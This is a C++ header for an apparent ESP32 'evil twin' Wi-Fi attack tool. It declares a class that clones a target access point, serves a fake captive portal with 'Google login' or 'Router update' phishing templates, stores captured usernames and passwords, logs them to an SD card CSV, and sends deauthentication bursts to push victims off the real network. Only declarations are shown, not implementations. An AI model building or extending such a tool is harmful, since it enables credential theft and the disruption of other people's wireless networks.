#ifndef EVILTWIN_H
#define EVILTWIN_H

#include <Arduino.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "display_manager.h"
#include "sdcard_manager.h"

#define ET_LOG_PATH  "/logs/eviltwin.csv"
#define ET_PER_PAGE  5

class EvilTwin {
public:
    EvilTwin(DisplayManager& dm, SDCardManager& sd);
    void start(const char* ssid);

private:
    DisplayManager& dm;
    SDCardManager&  sd;

    WebServer server;
    DNSServer dns;

    // portal state
    char  _ssid[33];
    int   _tmpl;          // 0=Google login  1=Router update
    int   _captureCount;
    char  _lastUser[48];
    char  _lastPass[48];
    bool  _dirty;

    // clone / deauth state
    bool     _isClone;
    uint8_t  _targetBSSID[6];
    int      _targetChannel;
    bool     _deauthEnabled;
    uint32_t _deauthLastMs;
    int      _deauthCount;

    // -- setup UI --
    int  showModeMenu();
    bool doScanAndPick();
    void drawScanList(int total, int page);
    bool promptCustomSSID();
    bool askDeauth();

    // -- portal handlers --
    void setupRoutes();
    void handleRoot();
    void handlePost();
    void handleRedirect();

    // -- runtime --
    void drawScreen();
    void sendDeauthBurst();
};

#endif // EVILTWIN_H
